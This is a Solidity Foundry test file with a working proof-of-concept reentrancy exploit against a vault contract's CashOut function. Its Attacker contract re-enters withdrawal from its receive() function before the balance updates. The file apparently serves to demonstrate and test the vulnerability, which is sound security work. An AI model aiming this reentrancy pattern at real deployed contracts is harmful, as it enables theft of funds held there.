
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether. We deposit 2 * attackVal.
        // So 2 * attackVal must be > 1 ether. attackVal > 0.5 ether.
        vm.assume(attackVal > 0.6 ether);
        vm.assume(attackVal < 50 ether); // Avoid excessive ETH amounts

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed other than deployment.

        // --- 3. Funding ---
        // Fund the victim to ensure it has liquidity (though we are withdrawing our own funds in this proof-of-concept)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract so it can fund the Attacker
        vm.deal(address(this), attackVal * 3);

        // --- 4. Trigger Attack ---
        // We deposit 2x the attackVal. This allows us to withdraw attackVal twice (once normally, once via reentrancy).
        // This proves the reentrancy control flow works without triggering Solidity 0.8.x underflow protection.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public valToWithdraw;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        valToWithdraw = val;
        
        // Deposit funds to pass the balance check in CashOut.
        // We deposit enough to cover both the initial call and the re-entrant call.
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        victim.CashOut(val);

        // Verify Success Conditions
        // If attackCallCount > 0, it means we successfully re-entered.
        if (attackCallCount > 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            // Because the state (balance) hasn't been updated yet, this call succeeds.
            victim.CashOut(valToWithdraw);
        }
    }
}
